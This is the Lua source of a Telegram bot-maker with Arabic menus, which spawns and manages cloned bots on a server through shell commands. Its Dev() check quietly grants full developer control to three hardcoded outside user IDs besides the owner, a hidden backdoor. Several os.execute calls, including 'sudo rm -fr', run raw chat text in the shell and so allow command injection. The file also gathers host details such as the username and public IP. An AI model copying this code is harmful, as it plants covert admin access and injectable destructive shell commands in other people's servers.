URL     = require("./libs/url")
JSON    = require("./libs/dkjson")
serpent = require("libs/serpent")
json = require('libs/json')
Redis = require('libs/redis').connect('127.0.0.1', 6379)
http  = require("socket.http")
https   = require("ssl.https")
-------------------
whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
uptime=io.popen([[echo `uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"D,",h+0,"H,",m+0,"M."}'`]]):read('*a'):gsub('[\n\r]+', '')
CPUPer=io.popen([[echo `top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`]]):read('*a'):gsub('[\n\r]+', '')
HardDisk=io.popen([[echo `df -lh | awk '{if ($6 == "/") { print $3"/"$2" ( "$5" )" }}'`]]):read('*a'):gsub('[\n\r]+', '')
linux_version=io.popen([[echo `lsb_release -ds`]]):read('*a'):gsub('[\n\r]+', '')
myip=io.popen([[echo `curl 'https://ip-check.online/myip.php' `]]):read('*a')
memUsedPrc=io.popen([[echo `free -m | awk 'NR==2{printf "%sMB/%sMB ( %.2f% )\n", $3,$2,$3*100/$2 }'`]]):read('*a'):gsub('[\n\r]+', '')
------------------

local Methods = io.open("./luatele.lua","r")
if Methods then
URL.tdlua_CallBack()
end
SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
luatele = require 'luatele'
local FileInformation = io.open("./Information.lua","r")
if not FileInformation then
if not Redis:get(SshId.."Info:Redis:Token") then
io.write('\27[1;31mارسل لي توكن البوت الان \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mعذرا توكن البوت خطأ تحقق منه وارسله مره اخره \nBot Token is Wrong\n')
else
io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
Redis:set(SshId.."Info:Redis:Token",TokenBot)
Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
end 
else
print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
end 
os.execute('lua Fast.lua')
end
if not Redis:get(SshId.."Info:Redis:User") then
io.write('\27[1;31mارسل يوزر المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
local UserSudo = io.read():gsub('@','')
if UserSudo ~= '' then
io.write('\n\27[1;34mتم حفظ يوزر المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User",UserSudo)
else
print('\n\27[1;34mلم يتم حفظ يوزر المطور الاساسي \nDeveloper UserName not saved\n')
end 
os.execute('lua Fast.lua')
end
if not Redis:get(SshId.."Info:Redis:User:ID") then
io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('(%d+)') then
io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User:ID",UserId)
else
print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
end 
os.execute('lua Fast.lua')
end
local Informationlua = io.open("Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..Redis:get(SshId.."Info:Redis:Token")..[[",
UserBot = "]]..Redis:get(SshId.."Info:Redis:Token:User")..[[",
UserSudo = "]]..Redis:get(SshId.."Info:Redis:User")..[[",
SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
}
]])
Informationlua:close()
local Fast = io.open("Fast", 'w')
Fast:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
lua5.3 Fast.lua
done
]])
Fast:close()
Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
os.execute('chmod +x Fast;chmod +x Fast;./Fast')
end
Information = dofile('./Information.lua')
Sudo_Id = Information.SudoId
UserSudo = Information.UserSudo
Token = Information.Token
UserBot = Information.UserBot
Fast = Token:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..Fast)
LuaTele = luatele.set_config{api_id=1846213,api_hash='c545c613b78f18a30744970910124d53',session_name=Fast,token=Token}
function var(value)
print(serpent.block(value, {comment=false}))   
end 
function download(url,name)
if not name then
name = url:match('([^/]+)$')
end
if string.find(url,'https') then
data,res = https.request(url)
elseif string.find(url,'http') then
data,res = http.request(url)
else
return 'The link format is incorrect.'
end
if res ~= 200 then
return 'check url , error code : '..res
else
file = io.open(name,'wb')
file:write(data)
file:close()
return './'..name
end
end
clock = os.clock
function sleep(n)
local t0 = clock()
while clock() - t0 <= n do end
end
function Dev(msg) 
ok = false
local list = {Sudo_Id,5885798452,5523863949,6059195246}
for k,v in pairs(list) do
if tonumber(msg.sender_id.user_id) == tonumber(v) then
ok = true
end
end
return ok
end

function Run(msg,data)  

if data.content and data.content.text and data.content.text.text then
text = data.content.text.text
end
if msg.message then
msg = msg.message
if msg.content.text and msg.content.text.text then
text = msg.content.text.text
end
end
if data.sender_id and data.sender_id.user_id then
if tonumber(data.sender_id.user_id) == tonumber(Fast) then
return false
end
end
function ChannelJoin(id)
JoinChannel = true
local chh = Redis:get(Fast.."chfalse")
if chh then
local url = https.request("https://api.telegram.org/bot"..Token.."/getchatmember?chat_id="..chh.."&user_id="..id)
data = json:decode(url)
if data.result.status == "left" or data.result.status == "kicked" then
JoinChannel = false 
end
end 
return JoinChannel
end
function send(chat,rep,text,parse,dis,clear,disn,back,markup)
LuaTele.sendText(chat,rep,text,parse,dis, clear, disn, back, markup)
end
if msg.sender_id and msg.sender_id.user_id then
if msg.sender_id.user_id == tonumber(Fast) then
return false
end
if Redis:get(Fast.."chsource") then
chsource = Redis:get(Fast.."chsource")
else
chsource = "SOURCE_HORSE"
end
function Reply_Status(UserId,TextMsg)
local UserInfo = LuaTele.getUser(UserId)
Name_User = UserInfo.first_name
if Name_User then
UserInfousername = '['..Name_User..'](tg://user?id='..UserId..')'
else
UserInfousername = UserId
end
return {
Lock     = '\n* 💥 بواسطه -> *'..UserInfousername..'\n*'..TextMsg..'\n 💥 خاصيه المسح *',
unLock   = '\n* 💥 بواسطه -> *'..UserInfousername..'\n'..TextMsg,
lockKtm  = '\n* 💥 بواسطه -> *'..UserInfousername..'\n*'..TextMsg..'\n 💥 خاصيه الكتم *',
lockKid  = '\n* 💥 بواسطه -> *'..UserInfousername..'\n*'..TextMsg..'\n 💥 خاصيه التقييد *',
lockKick = '\n* 💥 بواسطه -> *'..UserInfousername..'\n*'..TextMsg..'\n 💥 خاصيه الطرد *',
Reply    = '\n* 💥 المستخدم -> *'..UserInfousername..'\n*'..TextMsg..'*'
}
end

if Dev(msg) then
if text == "تحديث" or text == "اعاده التشغيل 💥" then
LuaTele.sendText(Sudo_Id,0,"💥 تمت اعاده تشغيل الملفات بنجاح ✅")
dofile('Fast.lua')  
return false 
end
if msg.reply_to_message_id ~= 0 then
local Message_Get = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Get.forward_info then
local Info_User = Redis:get(Fast.."Twasl:UserId"..Message_Get.forward_info.date) or 5523863949
if text == 'حظر' then
Redis:sadd(Fast..'BoI:In:Tuasl',Info_User)  
return send(msg.chat_id,msg.id,Reply_Status(Info_User,'💥 تم حظره من الصانع').Reply,"md",true)  
end 
if text =='الغاء الحظر' or text =='الغاء حظر' then
Redis:srem(Fast..'BoI:In:Tuasl',Info_User)  
return send(msg.chat_id,msg.id,Reply_Status(Info_User,'💥 تم الغاء حظره من الصانع ').Reply,"md",true)  
end 
end
end
if text == "💥 الغاء الامر" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
return send(msg.chat_id,msg.id,"💥 تم الغاء الامر بنجاح")
end
if text == "/start" or text == "💥القائمه الرئيسيه💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥قسم الحمايه💥',type = 'text'},
},
}
}
send(msg.chat_id,msg.id,"💥 الان اختار القسم مطوري 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥قسم البوتات💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥صنع بوت',type = 'text'},{text = '💥 حذف بوت',type = 'text'},
},
{
{text = '💥 تشغيل بوت',type = 'text'},{text = '💥 ايقاف بوت',type = 'text'},
},
{
{text = '💥 البوتات الوهميه',type = 'text'},{text = '💥 حذف البوتات الوهميه',type = 'text'},
},
{
{text = '💥 الغاء الامر',type = 'text'}
},
{
{text = '💥رجوع💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 انت الان في قسم البوتات 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥قسم الاشتراك والتواصل💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥 تفعيل الاشتراك الاجباري',type = 'text'},{text = '💥 تعطيل الاشتراك الاجباري',type = 'text'},
},
{
{text = '💥 تفعيل التواصل',type = 'text'},{text = '💥 تعطيل التواصل',type = 'text'},
},
{
{text = '💥 تعيين قناه البوت',type = 'text'}
},
{
{text = '💥 الغاء الامر',type = 'text'}
},
{
{text = '💥رجوع💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 انت الان في قسم الاشتراك الاجباري 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥الوضع المجاني💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥 تفعيل الوضع المجاني',type = 'text'},{text = '💥 تعطيل الوضع المجاني',type = 'text'},
},
{
{text = '💥 الغاء الامر',type = 'text'}
},
{
{text = '💥رجوع💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 انت الان في قسم الوضع المجاني 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥الاحصائيات💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥 الاحصائيات',type = 'text'},{text = '💥 تقرير البوتات',type = 'text'},
},
{
{text = '💥 عدد البوتات',type = 'text'},{text = '💥 فحص',type = 'text'},
},
{
{text = '💥 عدد بوتات الحمايه',type = 'text'}
},
{
{text = '💥 جلب نسخة الصانع',type = 'text'}
},
{
{text = '💥رجوع💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 انت الان في قسم الاحصائيات 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥الاذاعه💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥 اذاعه',type = 'text'},{text = '💥 اذاعه بالتوجيه',type = 'text'},
},
{
{text = '💥 اذاعه عام للمجموعات',type = 'text'},{text = '💥 اذاعه عام للمشتركين',type = 'text'},
},
{
{text = '💥 اذاعه بالتوجيه للمجموعات',type = 'text'},{text = '💥 اذاعه بالتوجيه للمشتركين',type = 'text'},
},
{
{text = '💥 الغاء الامر',type = 'text'}
},
{
{text = '💥رجوع💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 انت الان في قسم الاذاعه 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥قسم التحديثات💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥 تحديث المصنوعات',type = 'text'},{text = '💥 تشغيل البوتات',type = 'text'},
},
{
{text = 'اعاده التشغيل 💥',type = 'text'},
},
{
{text = '💥رجوع💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 انت الان في قسم الاشتراك الاجباري 💥 \n","md",true, false, false, true, reply_markup)
return false 
end
if text == "💥قسم الحمايه💥" or text == "💥رجوع💥" then
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥قسم البوتات💥',type = 'text'}
},
{
{text = '💥الاحصائيات💥',type = 'text'},{text = '💥الاذاعه💥',type = 'text'},
},
{
{text = '💥قسم الاشتراك والتواصل💥',type = 'text'}
},
{
{text = '💥الوضع المجاني💥',type = 'text'},{text = '💥قسم التحديثات💥',type = 'text'},
},

{
{text = '💥القائمه الرئيسيه💥',type = 'text'}
},
}
}
send(msg.chat_id,msg.id,"💥 اهلا بك عزيزي المطور الاساسي \n","md",true, false, false, true, reply_markup)
return false 
end
---
if text and text:match("^رفع مطور (%d+)$") then
Redis:sadd(Fast.."Dev",text:match("^رفع مطور (%d+)$"))
send(msg.chat_id,msg.id,'💥 تم رفع العضو مطور ف الصانع بنجاح ',"md",true)  
return false 
end
if text and text:match("^تنزيل مطور (%d+)$") then
Redis:srem(Fast.."Dev",text:match("^تنزيل مطور (%d+)$"))
send(msg.chat_id,msg.id,'💥 تم تنزيل العضو مطور من الصانع بنجاح ',"md",true)  
return false 
end
if text and text:match("^رفع مطور سورس (%d+)$") then
Redis:sadd("dev:all:source",text:match("^رفع مطور سورس (%d+)$"))
send(msg.chat_id,msg.id,'💥 تم رفع العضو مطور ف الصانع بنجاح ',"md",true)  
return false 
end
if text and text:match("^تنزيل مطور سورس (%d+)$") then
Redis:srem("dev:all:source",text:match("^تنزيل مطور سورس (%d+)$"))
send(msg.chat_id,msg.id,'💥 تم تنزيل العضو مطور من الصانع بنجاح ',"md",true)  
return false 
end
if text == "💥 تفعيل الوضع المجاني" then 
Redis:del(Fast.."free:bot")
send(msg.chat_id,msg.id,'💥 تم تفعيل الوضع المجاني ',"md",true)  
end
if text == "💥 تعطيل الوضع المجاني" then 
Redis:set(Fast.."free:bot",true)
send(msg.chat_id,msg.id,'💥 تم تعطيل الوضع المجاني ',"md",true)  
end
-----تشغيل البوتات ---
if text and Redis:get(Fast..msg.sender_id.user_id.."run:bot") then
Redis:del(Fast..msg.sender_id.user_id.."run:bot")
Redis:del(Fast.."screen:on")
Redis:del(Fast.."bots:folder")
userbot = text:gsub("@","")
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
Redis:sadd(Fast.."bots:folder",folder:gsub("@",""))
end
end
if not Redis:sismember(Fast.."bots:folder",userbot) then
send(msg.chat_id,msg.id,"💥 عفوا هذا البوت ليس ضمن البوتات المصنوعه")
return false 
end
for screen in io.popen('ls /var/run/screen/S-root'):lines() do
Redis:sadd(Fast.."screen:on",screen)
end
local list = Redis:smembers(Fast..'screen:on')
for k,v in pairs(list) do
if v:match("(%d+)."..userbot) then
send(msg.chat_id,msg.id,"💥 هذا البوت يعمل بالفعل")
return false 
end
end
os.execute("cd @"..userbot.." ; screen -d -m -S "..userbot.." ./Run")
send(msg.chat_id,msg.id,"💥 تم تشغيل البوت @"..userbot.." بنجاح")
return false 
end
if text == "💥 تشغيل بوت" then
Redis:set(Fast..msg.sender_id.user_id.."run:bot",true)
send(msg.chat_id,msg.id,"💥 ارسل يوزر البوت ليتم تشغيله")
return false 
end
---ايقاف البوتات
if text and Redis:get(Fast..msg.sender_id.user_id.."stop:bot") then
Redis:del(Fast..msg.sender_id.user_id.."stop:bot")
Redis:del(Fast.."screen:on")
Redis:del(Fast.."bots:folder")
userbot = text:gsub("@","")
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
Redis:sadd(Fast.."bots:folder",folder:gsub("@",""))
end
end
if not Redis:sismember(Fast.."bots:folder",userbot) then
send(msg.chat_id,msg.id,"💥 عفوا هذا البوت ليس ضمن البوتات المصنوعه")
return false 
end
for screen in io.popen('ls /var/run/screen/S-root'):lines() do
Redis:sadd(Fast.."screen:on",screen)
end
local list = Redis:smembers(Fast..'screen:on')
for k,v in pairs(list) do
if v:match("(%d+)."..userbot) then
os.execute('screen -X -S '..userbot..' quit')
send(msg.chat_id,msg.id,"💥 تم ايقاف البوت @"..userbot.." بنجاح")
return false 
end
end
send(msg.chat_id,msg.id,"?? البوت متوقف بالفعل")
return false 
end
if text == "💥 ايقاف بوت" then
Redis:set(Fast..msg.sender_id.user_id.."stop:bot",true)
send(msg.chat_id,msg.id,"💥 ارسل يوزر البوت ليتم ايقافه")
return false 
end
--الاشتراك الاجباري 
if Redis:get(Fast.."ch:Subscribe"..msg.sender_id.user_id) == "on" then
Redis:set(Fast.."ch:Subscribe"..msg.sender_id.user_id,"off")
local m = https.request("http://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
da = json:decode(m)
if da.result.invite_link then
local ch = da.result.id
send(msg.chat_id,msg.id,'💥 تم حفظ القناه ',"md",true)  
Redis:del(Fast.."chfalse")
Redis:set(Fast.."chfalse",ch)
Redis:del(Fast.."ch:admin")
Redis:set(Fast.."ch:admin",da.result.invite_link)
else
send(msg.chat_id,msg.id,'💥 اليوزر خطأ او البوت ليس مشرف في القناه ',"md",true)  
end
end
if text == "💥 تفعيل الاشتراك الاجباري" then
Redis:set(Fast.."ch:Subscribe"..msg.sender_id.user_id,"on")
send(msg.chat_id,msg.id,'💥 ارسل الان يوزر القناه ',"md",true)  
end
if text == "💥 تعطيل الاشتراك الاجباري" then
Redis:del(Fast.."ch:admin")
Redis:del(Fast.."chfalse")
send(msg.chat_id,msg.id,'💥 تم حذف القناه ',"md",true)  
end
if text and Redis:get(Fast..msg.sender_id.user_id.."Fast:bot") == "devuser" then
local UserName = text:match("^@(.*)$")
if UserName then
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
send(msg.chat_id,msg.id,"💥 اليوزر ليس لحساب شخصي تأكد منه ","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
send(msg.chat_id,msg.id,"💥 اليوزر لقناه او مجموعه تأكد منه","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
send(msg.chat_id,msg.id,"💥 عذرا يجب ان تستخدم يوزر لحساب شخصي فقط ","md",true)  
return false
end
local botuoken = Redis:get(Fast..msg.sender_id.user_id.."botuoken")
local botuseriu = Redis:get(Fast..msg.sender_id.user_id.."botuseriu")
local uu = LuaTele.getUser(UserId_Info.id)
local Informationlua = io.open("./source/Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..botuoken..[[",
UserBot = "]]..botuseriu..[[",
UserSudo = "]]..UserName..[[",
SudoId = ]]..UserId_Info.id..[[
}
]])
Informationlua:close()
os.execute('cp -a ./source/. ./@'..botuseriu..' && cd @'..botuseriu..' && chmod +x * && screen -d -m -S '..botuseriu..' ./Run')
Redis:sadd(Fast.."userbots",botuseriu)
Redis:del(Fast..msg.sender_id.user_id.."botuoken")
Redis:del(Fast..msg.sender_id.user_id.."botuseriu")
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
send(msg.chat_id,msg.id,"💥 تم تشغيل البوت بنجاح \n 💥 يوزر البوت [@"..botuseriu.."]\n 💥 المطور 💥 ["..uu.first_name.."](tg://user?id="..UserId_Info.id..")","md",true)  
else
send(msg.chat_id,msg.id,"💥 اليوزر ليس لحساب شخصي تأكد منه ","md",true)  
end
end
if text and Redis:get(Fast..msg.sender_id.user_id.."Fast:bot") == "token" then
if text:match("(%d+):(.*)") then
local url = https.request("http://api.telegram.org/bot"..text.."/getme")
local json = JSON.decode(url)
if json.ok == true then
local botuseriu = json.result.username
if Redis:sismember(Fast.."userbots",botuseriu) then
send(msg.chat_id,msg.id, "\n 💥 عذرا هذا البوت مصنوع بالفعل","md",true)  
return false 
end 
Redis:set(Fast..msg.sender_id.user_id.."botuseriu",botuseriu)
Redis:set(Fast..msg.sender_id.user_id.."botuoken",text)
Redis:set(Fast..msg.sender_id.user_id.."Fast:bot","devuser")
send(msg.chat_id,msg.id, "\n 💥 ارسل الان يوزر المطور الاساسي ")
return false 
end
send(msg.chat_id,msg.id, "\n 💥 التوكن الذي ارسلته غير صحيح ")
return false
end
send(msg.chat_id,msg.id, "\n 💥 من فضلك ارسل التوكن بشكل صحيح ")
end
if text == "💥صنع بوت" then
Redis:set(Fast..msg.sender_id.user_id.."Fast:bot","token")
send(msg.chat_id,msg.id, "\n 💥 ارسل توكن البوت الان","md",true)  
return false 
end 
----------end making
-------screen -ls
if text == "💥 الاسكرينات المفتوحه" then  
rqm = 0
local message = '💥 السكرينات الموجوده بالسيرفر \n\n'
for screnName in io.popen('ls /var/run/screen/S-root'):lines() do
rqm = rqm + 1
message = message..rqm..' -> 『 `'..screnName..' ` 』\n'
end
send(msg.chat_id,msg.id,message..'\n حاليا عندك `'..rqm..'` اسكرين مفتوح ...\n',"md",true)
return false
end
---all stutes
if text == "💥 تقرير البوتات" then
local txx = "💥 تقرير باحصائيات بوتاتك\n"
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
txx = txx.."💥 ["..botuseriu.."] *("..#list.." GP)*".." *("..#lt.." PV)*".."\n"
end
end
send(msg.chat_id,msg.id,txx,"md",true)
end
if text == "💥 فحص" then
Redis:del(Fast.."All:pv:st")
Redis:del(Fast.."All:gp:st")
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
Redis:incrby(Fast.."All:gp:st",tonumber(#list))
Redis:incrby(Fast.."All:pv:st",tonumber(#lt))
end
end
send(msg.chat_id,msg.id,'\n 💥 احصائيات جميع البوتات المصنوعه \n 💥 عدد المجموعات '..Redis:get(Fast.."All:gp:st")..' مجموعه \n 💥 عدد المشتركين '..Redis:get(Fast.."All:pv:st")..' مشترك',"html",true)
end
-----BoI all
if text and text:match('^حظر عام (%d+)$') then
local id = text:match('^حظر عام (%d+)$')
local U = LuaTele.getUser(id)
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
Redis:sadd(bot_id.."BoIAll:Groups",id) 
end
end
if U.first_name then
name = U.first_name
else
name = id
end
send(msg.chat_id,msg.id,"💥 العضو ["..name.."](tg://user?id="..id..")\n 💥 تم حظره عام","md",true)
end
if text and text:match('^الغاء عام (%d+)$') then
local id = text:match('^الغاء عام (%d+)$')
local U = LuaTele.getUser(id)
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
Redis:srem(bot_id.."BoIAll:Groups",id) 
end
end
if U.first_name then
name = U.first_name
else
name = id
end
send(msg.chat_id,msg.id,"💥 العضو ["..name.."](tg://user?id="..id..")\n 💥 تم الغاء حظره عام","md",true)
end
----update bots
if text == "💥 تحديث المصنوعات" then
Redis:del(Fast..'3ddbots')
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
os.execute('cp -a ./update/. ./'..folder..' && cd '..folder..' &&chmod +x * && screen -X -S '..folder:gsub("@","")..' quit && screen -d -m -S '..folder:gsub("@","")..' ./Run')
Redis:sadd(Fast..'3ddbots',folder)
end
end
os.execute('cp -a ./update/. ./source')
local list = Redis:smembers(Fast..'3ddbots')
send(msg.chat_id,msg.id,"تم تحديث『 "..#list.." 』بوت","html",true)  
end
if text == "💥 تشغيل البوتات" then
Redis:del(Fast..'3ddbots')
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
os.execute('cd '..folder..' && chmod +x * && screen -d -m -S '..folder:gsub("@","")..' ./Run')
Redis:sadd(Fast..'3ddbots',folder)
end
end
local list = Redis:smembers(Fast..'3ddbots')
send(msg.chat_id,msg.id,"تم تشغيل『 "..#list.." 』بوت","html",true)  
end
--------mange bots
if text == "💥 حذف البوتات الوهميه" then
Redis:del(Fast.."fake")
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
if #list < 2 then
Redis:sadd(Fast.."fake",botuseriu )
os.execute("sudo rm -fr "..botuseriu)
os.execute('screen -X -S '..botuseriu:gsub("@","")..' quit')
end
end
end
local list = Redis:smembers(Fast..'fake')
send(msg.chat_id,msg.id,"💥 تم ايقاف『 "..#list.." 』بوت \n عدد مجموعاتهم اقل من 2","html",true)
end
if text == "💥 البوتات الوهميه" then
local txx = "قائمه بوتاتك الوهيمه \n"
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
if #list < 2 then
txx = txx.."💥 "..botuseriu.." -> "..#list.."\n"
end
end
end
send(msg.chat_id,msg.id,txx,"html",true)
end
-------delete 
if text and Redis:get(Fast..msg.sender_id.user_id.."Fast:bot") == "del" then
if text == "الغاء" or text == '💥 الغاء الامر' then   
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
send(msg.chat_id,msg.id, "\n 💥 تم الغاء تعيين قناه السورس","md",true)  
return false 
end 
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
os.execute("sudo rm -fr "..text)
os.execute("screen -X -S "..text:gsub("@","").." quit")
Redis:srem(Fast.."userbots",text:gsub("@",""))
send(msg.chat_id,msg.id, "\n 💥 تم حذف البوت بنجاح","md",true)  
return false 
end 
if text == "💥 حذف بوت" then
Redis:set(Fast..msg.sender_id.user_id.."Fast:bot","del")
send(msg.chat_id,msg.id, "\n 💥 ارسل يوزر البوت الان","md",true)  
return false 
end 
----end deleting 
-----states
if text == "💥 عدد البوتات" or text == "💥 عدد بوتات الحمايه" then
Redis:del(Fast..'3ddbots')
bots = "\n💥 قائمه البوتات المصنوعه ↑↓\n"
botat = "\n💥 قائمه البوتات المصنوعه ↑↓\n"
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
Redis:sadd(Fast..'3ddbots',botuseriu..' -> '..devbot)
end
end
local list = Redis:smembers(Fast..'3ddbots')
if #list <= 100 then
for k,v in pairs(list) do
bots = bots..' '..k..'-'..v..'\n'
end
else
for k = 1,100 do
bots = bots..' '..k..'-'..list[k]..'\n'
end
for i = 101 , #list do
botat = botat..' '..i..'-'..list[i]..'\n'
end
end
if #list <= 100 then
send(msg.chat_id,msg.id,bots.."\n".."وعددهم ->『 "..#list.." 』","html",true)  
else
send(msg.chat_id,msg.id,bots,"html",true)  
send(msg.chat_id,msg.id,botat.."\n".."وعددهم ->『 "..#list.." 』","html",true)  
end
end
----end--3dd
if text and Redis:get(Fast..msg.sender_id.user_id.."setchannel") then
if text == "الغاء" or text == '💥 الغاء الامر' then   
Redis:del(Fast..msg.sender_id.user_id.."setchannel")
send(msg.chat_id,msg.id, "\n 💥 تم الغاء تعيين قناه السورس","md",true)  
return false 
end 
if text:match("@(.*)") then
local ch = text:match("@(.*)")
Redis:set(Fast.."chsource",ch)
send(msg.chat_id,msg.id,"💥 تم تعيين قناه البوت بنجاح")
Redis:del(Fast..msg.sender_id.user_id.."setchannel")
else
send(msg.chat_id,msg.id,"💥 ارسل اليوزر مع علامه @")
end
end
